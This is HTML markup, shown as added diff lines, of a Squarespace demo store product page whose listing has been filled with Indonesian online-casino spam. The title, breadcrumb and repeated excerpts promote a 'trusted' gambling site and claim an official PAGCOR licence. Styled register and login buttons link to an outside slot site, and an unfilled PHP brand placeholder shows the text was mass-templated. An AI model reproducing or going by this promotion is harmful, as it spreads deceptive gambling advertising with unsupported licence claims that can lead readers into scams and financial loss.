+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;blurBackground&quot;: {
+&quot;enabled&quot;: false,
+&quot;blurRadius&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 12.0
+}
+},
+&quot;backgroundColor&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;white&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+},
+&quot;navigationColor&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;dropShadowOptions&quot;: {
+&quot;enabled&quot;: false,
+&quot;blur&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 12.0
+},
+&quot;spread&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 0.0
+},
+&quot;distance&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 12.0
+}
+},
+&quot;borderOptions&quot;: {
+&quot;enabled&quot;: false,
+&quot;position&quot;: &quot;allSides&quot;,
+&quot;thickness&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 4.0
+},
+&quot;color&quot;: {
+&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+&quot;sitePaletteColor&quot;: {
+&quot;colorName&quot;: &quot;black&quot;,
+&quot;alphaModifier&quot;: 1.0
+}
+}
+},
+&quot;showPromotedElement&quot;: false,
+&quot;buttonVariant&quot;: &quot;primary&quot;,
+&quot;blurBackground&quot;: {
+&quot;enabled&quot;: false,
+&quot;blurRadius&quot;: {
+&quot;unit&quot;: &quot;px&quot;,
+&quot;value&quot;: 12.0
+}
+},
+&quot;headerOpacity&quot;: {
+&quot;unit&quot;: &quot;%&quot;,
+&quot;value&quot;: 100.0
+}
+}"
+      data-section-id="overlay-nav"
+      data-show-account-login="true"
+      data-test="header-menu">
+      <div class="header-menu-bg theme-bg--primary"></div>
+      <div class="header-menu-nav">
+        <nav class="header-menu-nav-list">
+          <div data-folder="root" class="header-menu-nav-folder">
+            <div class="header-menu-nav-folder-content">
+              <!-- Menu Navigation -->
+<div class="header-menu-nav-wrapper">
+  
+    
+      
+        
+          
+            <div class="container header-menu-nav-item header-menu-nav-item--collection header-menu-nav-item--active">
+              <a
+                href="/store-2"
+                
+                  aria-current="page"
+                
+              >
+                <div class="header-menu-nav-item-content">
+                  Store 2
+                </div>
+              </a>
+            </div>
+          
+        
+      
+    
+      
+        
+          
+            <div class="container header-menu-nav-item header-menu-nav-item--collection">
+              <ahref="/store-1-1"
+                
+              ><div class="header-menu-nav-item-content">
+                  Store 1
+                </div>
+              </a>
+            </div>
+          
+        
+      
+    
+      
+        
+          
+            <div class="container header-menu-nav-item header-menu-nav-item--collection">
+              <a
+                href="/services"
+                
+              >
+                <div class="header-menu-nav-item-content">
+                  Services
+                </div>
+              </a>
+            </div>
+          
+        
+      
+    
+      
+        
+          
+            <div class="container header-menu-nav-item header-menu-nav-item--collection">
+              <a
+                href="/team"
+                
+              >
+                <div class="header-menu-nav-item-content">
+                  Team
+                </div>
+              </a>
+            </div>
+          
+        
+      
+    
+      
+        
+          
+            <div class="container header-menu-nav-item header-menu-nav-item--collection">
+              <a
+                href="/health-safety"
+                
+              >
+                <div class="header-menu-nav-item-content">
+                  Health &amp; Safety
+                </div>
+              </a>
+            </div>
+          
+        
+      
+    
+  
+</div>
+
+              
+                
+                  <div
+                    class="user-accounts-link header-menu-nav-item header-nav-item--collection customerAccountLoginMobile"
+                    data-controller="UserAccountLink"
+                    data-animation-role="header-element"
+                  >
+                    <a class="user-accounts-text-link header-nav-item" href="#" data-animation-role="header-element">
+  <span class="unauth">Login</span>
+  <span class="auth">Account</span>
+</a>
+                </div>
+                
+              
+            </div>
+            
+            
+            
+            <div class="header-menu-cta">
+              <a
+                class="theme-btn--primary btn sqs-button-element--primary"
+                href="/book-appointment"
+                
+              >
+                Book appointment
+              </a>
+            </div>
+            
+          </div>
+        </nav>
+      </div>
+    </div>
+  </header>
+
+
+
+
+      <main id="page" class="container" role="main">
+        
+          
+<article class="sections" id="sections" data-page-sections="664218133d98d37de610c113">
+  
+  
+    
+    
+
+
+  
+
+
+<section
+  data-test="page-section"
+  
+  data-section-theme=""
+  class='page-section 
+    
+      content-collection
+      full-bleed-section
+      collection-type-products
+    
+    background-width--full-bleed
+    
+      section-height--medium
+    
+    
+      content-width--wide
+    
+    horizontal-alignment--center
+    vertical-alignment--middle
+    
+      
+    
+    
+    '
+  
+  data-section-id="664218133d98d37de610c115"
+  
+  data-controller="SectionWrapperController"
+  data-current-styles="{
+&quot;imageOverlayOpacity&quot;: 0.15,
+&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
+&quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
+&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
+&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
+&quot;contentWidth&quot;: &quot;content-width--wide&quot;,
+&quot;sectionTheme&quot;: &quot;&quot;,
+&quot;sectionAnimation&quot;: &quot;none&quot;,
+&quot;backgroundMode&quot;: &quot;image&quot;
+}"
+  data-current-context="{
+&quot;video&quot;: {
+&quot;playbackSpeed&quot;: 0.5,
+&quot;filter&quot;: 1,
+&quot;filterStrength&quot;: 0,
+&quot;zoom&quot;: 0,
+&quot;videoSourceProvider&quot;: &quot;none&quot;
+},
+&quot;backgroundImageId&quot;: null,
+&quot;backgroundMediaEffect&quot;: null,
+&quot;divider&quot;: null,
+&quot;typeName&quot;: &quot;products&quot;
+}"
+  data-animation="none"
+  
+   
+  
+  
+>
+  <div
+    class="section-border"
+    
+  >
+    <div class="section-background">
+    
+      
+    
+    </div>
+  </div>
+  <div
+    class='content-wrapper'
+    style='
+      
+      
+    '
+  >
+    <div
+      class="content"
+      
+    >
+      
+      
+      
+      
+      
+      
+      
+<section 
+  id="pdp"
+  class="
+    products
+    collection-content-wrapper
+    product-layout-side-by-side
+  "
+>
+	
+
+
+
+  
+  
+  
+
+  <article class="ProductItem hentry author-pasti-bisa post-type-store-item" data-item-id="664218133d98d37de610c10e">
+
+    <nav class="ProductItem-nav">
+  <div class="ProductItem-nav-breadcrumb" data-animation-role="content">
+    <a href="/store-2" class="ProductItem-nav-breadcrumb-link">Store 2</a>
+    <span class="ProductItem-nav-breadcrumb-separator"></span>
+    <a href="/store-2/p/golden-mist-cup-weny8-gfw52" class="ProductItem-nav-breadcrumb-link"> <?php echo $BRANDS ?> Live Casino 🧞‍♂️ Situs Judi Online Terpercaya Di Indonesia</a>
+  </div>
+  
+  
+  
+</nav>
+
+
+    <section class="ProductItem-summary" data-controller="ProductGallery">
+      <section
+  aria-label="Gallery"
+  class="ProductItem-gallery"
+  data-product-gallery="container"
+>
+  
+  
+    <div
+      class="ProductItem-gallery-slides"
+      data-animation-role="image"
+      data-product-gallery="slides"
+    >
+      
+      
+        
+          <div
+            class="ProductItem-gallery-slides-item"
+            data-slide-index="1"
+            data-image-id=6651a03674a1ce3d4e77579d
+            data-controller="ImageZoom"
+            data-slide-url="519fr5fwasplbing9bdff55e3ve4vz"
+            data-product-gallery="slides-item"
+            data-test="pdp-gallery-slide"
+          >
+            <img
+              aria-describedby="ProductItem-gallery-slides-item-1-index-6651a03674a1ce3d4e77579d"
+              class="ProductItem-gallery-slides-item-image"
+              data-load="false"
+              data-src="https://images.squarespace-cdn.com/content/v1/66407f51bb226442cd6da439/1716625466151-Q20JBCTGZI0KGTYCCRG2/Screenshot+2024-04-15+063415.png" data-image="https://images.squarespace-cdn.com/content/v1/66407f51bb226442cd6da439/1716625466151-Q20JBCTGZI0KGTYCCRG2/Screenshot+2024-04-15+063415.png" data-image-dimensions="952x649" data-image-focal-point="0.5,0.5" alt="Screenshot 2024-04-15 063415.png" 
+              elementtiming="nbf-products-gallery"
+            />
+            <span
+              id="ProductItem-gallery-slides-item-1-index-6651a03674a1ce3d4e77579d"
+              style="display: none;"
+            >
+              Image 1 of 
+            </span>
+            <div class="product-image-zoom-duplicate" aria-hidden="true">
+              <img data-load="false" data-src="https://images.squarespace-cdn.com/content/v1/66407f51bb226442cd6da439/1716625466151-Q20JBCTGZI0KGTYCCRG2/Screenshot+2024-04-15+063415.png" data-image="https://images.squarespace-cdn.com/content/v1/66407f51bb226442cd6da439/1716625466151-Q20JBCTGZI0KGTYCCRG2/Screenshot+2024-04-15+063415.png" data-image-dimensions="952x649" data-image-focal-point="0.5,0.5" alt="Screenshot 2024-04-15 063415.png"  elementtiming="nbf-products-gallery-zoom" />
+            </div>
+          </div>
+        
+        
+      
+      <div
+        class="gallery-lightbox-outer-wrapper"
+        data-use-image-loader="true"
+        data-controller="Lightbox"
+      >
+        <div class="gallery-lightbox" data-section-theme="">
+  <div class="gallery-lightbox-background"></div>
+
+<div class="gallery-lightbox-header">
+  <button class="gallery-lightbox-close-btn" aria-label="Close" data-close data-test="gallery-lightbox-close">
+    <div class="gallery-lightbox-close-btn-icon">
+      <svg viewBox="0 0 40 40">
+        <path d="M4.3,35.7L35.7,4.3"/>
+        <path d="M4.3,4.3l31.4,31.4"/>
+      </svg>
+    </div>
+  </button>
+</div>
+
+
+  <div class="gallery-lightbox-wrapper">
+    <div class="gallery-lightbox-list">
+      
+      <figure class="gallery-lightbox-item" data-slide-url="519fr5fwasplbing9bdff55e3ve4vz">
+        <div class="gallery-lightbox-item-wrapper">
+          <div class="gallery-lightbox-item-src">
+            <div class="gallery-lightbox-item-img content-fit">
+              <img data-src="https://images.squarespace-cdn.com/content/v1/66407f51bb226442cd6da439/1716625466151-Q20JBCTGZI0KGTYCCRG2/Screenshot+2024-04-15+063415.png" data-image="https://images.squarespace-cdn.com/content/v1/66407f51bb226442cd6da439/1716625466151-Q20JBCTGZI0KGTYCCRG2/Screenshot+2024-04-15+063415.png" data-image-dimensions="952x649" data-image-focal-point="0.5,0.5" alt="Screenshot 2024-04-15 063415.png"  data-load="false" elementtiming="nbf-product-lightbox" />
+            </div>
+          </div>
+        </div>
+      </figure>
+      
+    </div>
+
+    <div class="gallery-lightbox-controls" data-test="gallery-lightbox-controls">
+  <div class="gallery-lightbox-control" data-previous data-test="gallery-lightbox-control-previous">
+    <button class="gallery-lightbox-control-btn" aria-label="Previous Slide">
+      <div class="gallery-lightbox-control-btn-icon">
+        <svg class="caret-left-icon--small" viewBox="0 0 9 16">
+          <polyline fill="none" stroke-miterlimit="10" points="7.3,14.7 2.5,8 7.3,1.2 "/>
+        </svg>
+      </div>
+    </button>
+  </div>
+  <div class="gallery-lightbox-control" data-next data-test="gallery-lightbox-control-next">
+    <button class="gallery-lightbox-control-btn" aria-label="Next Slide">
+      <div class="gallery-lightbox-control-btn-icon">
+        <svg class="caret-right-icon--small" viewBox="0 0 9 16">
+          <polyline fill="none" stroke-miterlimit="10" points="1.6,1.2 6.5,7.9 1.6,14.7 "/>
+        </svg>
+      </div>
+    </button>
+  </div>
+</div>
+
+  </div>
+</div>
+      </div>
+    </div>
+  
+</section>
+
+      
+
+
+
+
+<section
+  class="
+    product-details
+    ProductItem-details
+  "
+  data-test="pdp-details"
+  data-current-context='{
+      "isSubscription": "false",
+      "subscriptionType": ""
+  }'
+><style>
+  .JEMBUT {
+  display: grid;
+  grid-template-columns: repeat(2,1fr);
+  font-weight: 700;
+  }
+  .JEMBUT a {
+  text-align: center;
+  }
+  .login, .register {
+  color: #fff;
+  padding: 13px 10px;
+  }
+  .login, .login-button {
+  border: 1px solid #000000;
+  background: linear-gradient(to bottom,#DC143C 0,#DC143C 100%);
+  }
+  .register, .register-button {
+  background: linear-gradient(to bottom,#167FF7 0,#167FF7 100%);
+  border: 1px solid #000000;
+  }
+  </style>
+<div class="JEMBUT">
+<a href="https://moriahslot.pages.dev/" rel="nofollow noreferrer" class="register">DAFTAR</a>
+<a href="https://moriahslot.pages.dev/" rel="nofollow noreferrer" class="login">LOGIN</a>
+</div>
+  <h1
+    class="ProductItem-details-title"
+    data-content-field="title"
+    data-test="pdp-title"
+  >
+     <?php echo $BRANDS ?> Live Casino 🧞‍♂️ Situs Judi Online Terpercaya Di Indonesia
+  </h1>
+  <div
+    data-controller="ProductItemVariants,ProductCartButton" 
+    class="ProductItem-details-checkout"
+  >
+    
+    <div
+      class="ProductItem-product-price"
+      data-animation-role="content"
+    >
+      
+
+
+<div class="product-price">
+IDR. 25.000
+</div>
+
+      
+        
+<div data-afterpay="true" data-current-context="{
+&quot;664218133d98d37de610c10e&quot;: {
+&quot;scarcityEnabled&quot;: false,
+&quot;scarcityShownByDefault&quot;: false,
+&quot;customSoldOutText&quot;: &quot;Sold Out&quot;,
+&quot;afterPayAvailable&quot;: false,
+&quot;klarnaAvailable&quot;: false,
+&quot;shopperLanguage&quot;: &quot;en&quot;,
+&quot;afterPayMin&quot;: 0,
+&quot;afterPayMax&quot;: 0,
+&quot;klarnaMin&quot;: 0,
+&quot;klarnaMax&quot;: 0,
+&quot;mailingListSignUpEnabled&quot;: false,
+&quot;mailingListOptInByDefault&quot;: false
+}
+}"></div>
+<div class="pdp-overlay"></div>
+      
+
+      
+      
+    </div>
+    
+      <div
+        class="ProductItem-details-excerpt-below-price"
+        data-content-field="excerpt"
+      >
+        <p class="" style="white-space:pre-wrap;"><?php echo $BRANDS ?> Live Casino 🧞‍♂️ adalah situs judi online terpercaya nomor 1 di indonesia resmi dan sudah mendapat lisensi resmi dari pagcor menjadi pilihan utama tahun 2024.</p>
+      </div>
+    
+    
+    
+
+
+
+
+
+
+
+
+
+
+    <div
+      class="ProductItem-quantity-add-to-cart"
+    >
+      
+
+
+<div class="product-quantity-input" data-item-id="664218133d98d37de610c10e" data-animation-role="content">
+  <div class="quantity-label">Quantity:</div>
+  <input aria-label="Quantity" size="4" max="9999" min="1" value="1" type="number" step="1"></input>
+</div>
+      
+
+
+
+
+
+
+      
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="sqs-add-to-cart-button-wrapper" data-animation-role="button">
+  <div class="sqs-add-to-cart-button sqs-suppress-edit-mode sqs-editable-button sqs-button-element--primary " role="button" tabindex="0" data-dynamic-strings data-collection-id="664218133d98d37de610c0e5" data-item-id="664218133d98d37de610c10e" data-product-type="1" data-use-custom-label="false" data-original-label="Add To Cart" >
+    <div class="sqs-add-to-cart-button-inner">Add To Cart</div>
+  </div>
+</div>
+    </div>
+    
+      <div
+        class="ProductItem-details-excerpt-below-add-to-cart"
+        data-content-field="excerpt"
+      >
+        <p class="" style="white-space:pre-wrap;"><?php echo $BRANDS ?> Live Casino 🧞‍♂️ adalah situs judi online terpercaya nomor 1 di indonesia resmi dan sudah mendapat lisensi resmi dari pagcor menjadi pilihan utama tahun 2024.</p>
+      </div>
+       
+    
+    
+      <div
+        class="ProductItem-details-excerpt-below-add-ons"
+        data-content-field="excerpt"
+      >
+        <p class="" style="white-space:pre-wrap;"><?php echo $BRANDS ?> Live Casino 🧞‍♂️ adalah situs judi online terpercaya nomor 1 di indonesia resmi dan sudah mendapat lisensi resmi dari pagcor menjadi pilihan utama tahun 2024.</p>
+      </div>
+    
+  </div>
+</section>
+
+    </section>
+
+    
+      <section class="ProductItem-additional">
+        <div class="sqs-layout sqs-grid-12 columns-12" data-layout-label="Post Body" data-type="item" id="item-664218133d98d37de610c10e"><div class="row sqs-row"><div class="col sqs-col-12 span-12"><div class="sqs-block spacer-block sqs-block-spacer sized vsize-1" data-block-type="21" id="block-ecfdc6db9ac07af47208"><div class="sqs-block-content">&nbsp;</div></div><div class="row sqs-row"><div class="col sqs-col-4 span-4"><div class="sqs-block html-block sqs-block-html" data-block-type="2" id="block-77384fe7f15c8ad175cd"><div class="sqs-block-content">
+
+<div class="sqs-html-content">
+  <h4 style="white-space:pre-wrap;">Make it stand out</h4><p class="sqsrte-small" style="white-space:pre-wrap;">It all begins with an idea. Maybe you want to launch a business. </p><p class="" data-rte-preserve-empty="true" style="white-space:pre-wrap;"></p><h4 style="white-space:pre-wrap;">Build it</h4><p class="sqsrte-small" style="white-space:pre-wrap;">Maybe you want to turn a hobby into something more. Or maybe you have a creative project to share with the world.</p>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div><div class="col sqs-col-8 span-8"><div class="row sqs-row"><div class="col sqs-col-2 span-2"><div class="sqs-block spacer-block sqs-block-spacer sized vsize-1" data-block-type="21" id="block-b9f2e3747f3a5f58bee2"><div class="sqs-block-content">&nbsp;</div></div></div><div class="col sqs-col-6 span-6"><div class="sqs-block image-block sqs-block-image" data-block-type="5" id="block-0a35ba61a14e8e7bb1bb"><div class="sqs-block-content">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+    
+  
+    <div
+        class="
+          image-block-outer-wrapper
+          layout-caption-below
+          design-layout-inline
+          combination-animation-site-default
+          individual-animation-site-default
+          individual-text-animation-site-default
+        "
+        data-test="image-block-inline-outer-wrapper"
+    >
+
+      
+
+      
+        <figure
+            class="
+              sqs-block-image-figure
+              intrinsic
+            "
+            style="max-width:650px;"
+        >
+          
+        
+        
+
+        
+          
+            
+          <div
+              
+              
+              class="image-block-wrapper"
+              data-animation-role="image"
+              
+  
+
+          >
+            <div class="sqs-image-shape-container-element
+              
+          
+        
+              
+            " style="
+                position: relative;padding-bottom:124.9230728149414%;
+                
+                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
+              "
+              >
+                
+                
+                
+                
+                
+                
+                
+                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5ec321c2af33de48734cc929/1600709566842-V0D57N61ZW83B4J87Y15/product-detail-4x5_4.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5ec321c2af33de48734cc929/1600709566842-V0D57N61ZW83B4J87Y15/product-detail-4x5_4.jpg" data-image-dimensions="650x812" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="https://images.squarespace-cdn.com/content/v1/5ec321c2af33de48734cc929/1600709566842-V0D57N61ZW83B4J87Y15/product-detail-4x5_4.jpg" width="650" height="812" alt="" sizes="(max-width: 640px) 100vw, (max-width: 767px) 50vw, 50vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5ec321c2af33de48734cc929/1600709566842-V0D57N61ZW83B4J87Y15/product-detail-4x5_4.jpg?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5ec321c2af33de48734cc929/1600709566842-V0D57N61ZW83B4J87Y15/product-detail-4x5_4.jpg?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5ec321c2af33de48734cc929/1600709566842-V0D57N61ZW83B4J87Y15/product-detail-4x5_4.jpg?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5ec321c2af33de48734cc929/1600709566842-V0D57N61ZW83B4J87Y15/product-detail-4x5_4.jpg?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5ec321c2af33de48734cc929/1600709566842-V0D57N61ZW83B4J87Y15/product-detail-4x5_4.jpg?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5ec321c2af33de48734cc929/1600709566842-V0D57N61ZW83B4J87Y15/product-detail-4x5_4.jpg?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5ec321c2af33de48734cc929/1600709566842-V0D57N61ZW83B4J87Y15/product-detail-4x5_4.jpg?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs">
+
+            </div>
+          </div>
+        
+          
+        
+
+        
+      
+        </figure>
+      
+
+    </div>
+  
+
+
+  
+
+
+</div></div></div></div></div></div><div class="sqs-block spacer-block sqs-block-spacer" data-aspect-ratio="5.239179954441913" data-block-type="21" id="block-3e4b76bd317a3892c170"><div class="sqs-block-content">&nbsp;</div></div></div></div></div>
+      </section>
+    
+
+    
+    
+      <section>
+        
+      </section>
+    
+
+    
+
+  </article>
+
+
+
+</section>
+    </div>
+  
+  </div>
+  
+</section>
+
+  
+</article>
+
+
+          
+
+          
+          
+        
+      </main>
+      <script type="text/javascript">
+        const firstSection = document.querySelector('.page-section');
+        const header = document.querySelector('.header');
+        const mobileOverlayNav = document.querySelector('.header-menu');
+        const sectionBackground = firstSection ? firstSection.querySelector('.section-background') : null;
+        const headerHeight = header ? header.getBoundingClientRect().height : 0;
+        const firstSectionHasBackground = firstSection ? firstSection.className.indexOf('has-background') >= 0 : false;
+        const isFirstSectionInset = firstSection ? firstSection.className.indexOf('background-width--inset') >= 0 : false;
+        const isLayoutEngineSection = firstSection ? firstSection.className.indexOf('layout-engine-section') >= 0 : false;
+
+        if (firstSection) {
+          firstSection.style.paddingTop = headerHeight + 'px';
+        }
+        if (sectionBackground && isLayoutEngineSection) {
+          if (isFirstSectionInset) {
+            sectionBackground.style.top = headerHeight + 'px';
+          } else {
+            sectionBackground.style.top = '';
+          }
+        }
+        //# sourceURL=headerPositioning.js
+      </script>
+
+      
+        <footer class="sections" id="footer-sections" data-footer-sections>
+  
+  
+  
+  
+  
+  
+    
+    
+
+
+  
+
+
+<section
+  data-test="page-section"
+  
+  data-section-theme="bright"
+  class='page-section 
+    
+      full-bleed-section
+      layout-engine-section
+    
+    background-width--full-bleed
+    
+      
+        section-height--custom
+      
+    
+    
+      content-width--wide
+    
+    horizontal-alignment--center
+    vertical-alignment--middle
+    
+      
+    
+    
+    bright'
+  
+  data-section-id="66407f52bb226442cd6da450"
+  
+  data-controller="SectionWrapperController"
+  data-current-styles="{
+&quot;imageOverlayOpacity&quot;: 0.15,
+&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
+&quot;sectionHeight&quot;: &quot;section-height--custom&quot;,
+&quot;customSectionHeight&quot;: 10,
+&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
+&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
+&quot;contentWidth&quot;: &quot;content-width--wide&quot;,
+&quot;customContentWidth&quot;: 50,
+&quot;sectionTheme&quot;: &quot;bright&quot;,
+&quot;sectionAnimation&quot;: &quot;none&quot;,
+&quot;backgroundMode&quot;: &quot;image&quot;
+}"
+  data-current-context="{
+&quot;video&quot;: {
+&quot;playbackSpeed&quot;: 0.5,
+&quot;filter&quot;: 2,
+&quot;filterStrength&quot;: 0,
+&quot;zoom&quot;: 0,
+&quot;videoSourceProvider&quot;: &quot;none&quot;
+},
+&quot;backgroundImageId&quot;: null,
+&quot;backgroundMediaEffect&quot;: null,
+&quot;divider&quot;: null,
+&quot;typeName&quot;: &quot;products&quot;
+}"
+  data-animation="none"
+  data-fluid-engine-section
+   
+  
+     style="min-height: 10vh;" 
+  
+  
+>
+  <div
+    class="section-border"
+    
+  >
+    <div class="section-background">
+    
+      
+    
+    </div>
+  </div>
+  <div
+    class='content-wrapper'
+    style='
+      
+        
+          
+          
+          padding-top: calc(10vmax / 10); padding-bottom: calc(10vmax / 10);
+        
+      
+    '
+  >
+    <div
+      class="content"
+      
+    >
+      
+      
+      
+      
+      
+      
+      <div data-fluid-engine="true"><style>
+
+.fe-66407f52bb226442cd6da44f {
+  --grid-gutter: calc(var(--sqs-mobile-site-gutter, 6vw) - 11.0px);
+  --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (11.0px * (8 - 1)) ) / 8 );
+
+  display: grid;
+  position: relative;
+  grid-area: 1/1/-1/-1;
+  grid-template-rows: repeat(20,minmax(24px, auto));
+  grid-template-columns:
+    minmax(var(--grid-gutter), 1fr)
+    repeat(8, minmax(0, var(--cell-max-width)))
+    minmax(var(--grid-gutter), 1fr);
+  row-gap: 11.0px;
+  column-gap: 11.0px;
+}
+
+@media (min-width: 768px) {
+  .background-width--inset .fe-66407f52bb226442cd6da44f {
+    --inset-padding: calc(var(--sqs-site-gutter) * 2);
+  }
+
+  .fe-66407f52bb226442cd6da44f {
+    --grid-gutter: calc(var(--sqs-site-gutter, 4vw) - 11.0px);
+    --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (11.0px * (24 - 1)) ) / 24 );
+    --inset-padding: 0vw;
+
+    --row-height-scaling-factor: 0.0215;
+    --container-width: min(var(--sqs-site-max-width, 1500px), calc(100vw - var(--sqs-site-gutter, 4vw) * 2 - var(--inset-padding) ));
+
+    grid-template-rows: repeat(7,minmax(calc(var(--container-width) * var(--row-height-scaling-factor)), auto));
+    grid-template-columns:
+      minmax(var(--grid-gutter), 1fr)
+      repeat(24, minmax(0, var(--cell-max-width)))
+      minmax(var(--grid-gutter), 1fr);
+  }
+}
+
+
+  .fe-block-f707b3d6ea126aba4abc {
+    grid-area: 2/2/8/10;
+    z-index: 0;
+
+    @media (max-width: 767px) {
+      
+    }
+  }
+
+  .fe-block-f707b3d6ea126aba4abc .sqs-block {
+    justify-content: center;
+  }
+
+  .fe-block-f707b3d6ea126aba4abc .sqs-block-alignment-wrapper {
+    align-items: center;
+  }
+
+  @media (min-width: 768px) {
+    .fe-block-f707b3d6ea126aba4abc {
+      grid-area: 1/2/8/10;
+      z-index: 0;
+
+      
+    }
+
+    .fe-block-f707b3d6ea126aba4abc .sqs-block {
+      justify-content: center;
+    }
+
+    .fe-block-f707b3d6ea126aba4abc .sqs-block-alignment-wrapper {
+      align-items: center;
+    }
+  }
+
+  .fe-block-2ee6149735452573548e {
+    grid-area: 8/2/14/10;
+    z-index: 1;
+
+    @media (max-width: 767px) {
+      
+    }
+  }
+
+  .fe-block-2ee6149735452573548e .sqs-block {
+    justify-content: center;
+  }
+
+  .fe-block-2ee6149735452573548e .sqs-block-alignment-wrapper {
+    align-items: center;
+  }
+
+  @media (min-width: 768px) {
+    .fe-block-2ee6149735452573548e {
+      grid-area: 1/10/8/18;
+      z-index: 1;
+
+      
+    }
+
+    .fe-block-2ee6149735452573548e .sqs-block {
+      justify-content: center;
+    }
+
+    .fe-block-2ee6149735452573548e .sqs-block-alignment-wrapper {
+      align-items: center;
+    }
+  }
+
+  .fe-block-fa993e405972a6261871 {
+    grid-area: 14/2/20/10;
+    z-index: 2;
+
+    @media (max-width: 767px) {
+      
+    }
+  }
+
+  .fe-block-fa993e405972a6261871 .sqs-block {
+    justify-content: center;
+  }
+
+  .fe-block-fa993e405972a6261871 .sqs-block-alignment-wrapper {
+    align-items: center;
+  }
+
+  @media (min-width: 768px) {
+    .fe-block-fa993e405972a6261871 {
+      grid-area: 1/18/8/26;
+      z-index: 2;
+
+      
+    }
+
+    .fe-block-fa993e405972a6261871 .sqs-block {
+      justify-content: center;
+    }
+
+    .fe-block-fa993e405972a6261871 .sqs-block-alignment-wrapper {
+      align-items: center;
+    }
+  }
+
+</style><div class="fluid-engine fe-66407f52bb226442cd6da44f"><div class="fe-block fe-block-f707b3d6ea126aba4abc"><div class="sqs-block html-block sqs-block-html" data-block-type="2" id="block-f707b3d6ea126aba4abc"><div class="sqs-block-content">
+
+<div class="sqs-html-content">
+  <p style="text-align:center;white-space:pre-wrap;" class="sqsrte-small"><strong>HOURS<br><br></strong>Mon: CLOSED<br>Tue to Sun: 9 AM – 7 PM<br>Sat to Sun: 10 AM – 7 PM<br><br>123 DEMO ST<br>NEW YORK, NY 12345<br>(555) 555-5555<br></p>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div><div class="fe-block fe-block-2ee6149735452573548e"><div class="sqs-block html-block sqs-block-html" data-block-type="2" id="block-2ee6149735452573548e"><div class="sqs-block-content">
+
+<div class="sqs-html-content">
+  <p style="text-align:center;white-space:pre-wrap;" class="sqsrte-small"><strong>MENU<br></strong><br><a href="/services">Services</a><br><a href="/team">Team</a><br><a href="/health-safety">Health &amp; Safety</a><br><a href="/store/p/gift-card-7lk6p">Gift Card</a><br><a href="/portfolio">Portfolio</a><br><a href="/contact">Contact</a><br><a href="/book-appointment">Book appointment</a></p>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div><div class="fe-block fe-block-fa993e405972a6261871"><div class="sqs-block html-block sqs-block-html" data-block-type="2" id="block-fa993e405972a6261871"><div class="sqs-block-content">
+
+<div class="sqs-html-content">
+  <p style="text-align:center;white-space:pre-wrap;" class="sqsrte-small"><strong>FOLLOW US</strong><br><br><a href="https://instagram.com/squarespace">Instagram</a><br><a href="https://facebook.com/squarespace">Facebook</a><br><a href="https://twitter.com/squarespace">Twitter</a><br><a href="https://pinterest.com/squarespace">Pinterest</a></p><p style="text-align:center;white-space:pre-wrap;" class="sqsrte-small"><br>Made with <a href="http://squarespace.com" target="_blank">Squarespace</a><br></p>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div></div></div>
+    </div>
+  
+  </div>
+  
+</section>
+
+  
+</footer>
+
+      
+    </div>
+
+    <script defer="defer" src="https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/scripts/site-bundle.722e8db92a2a6ce75c0f85552b9fba6a.js" type="text/javascript"></script>
+    
+
+  </body>
+</html>
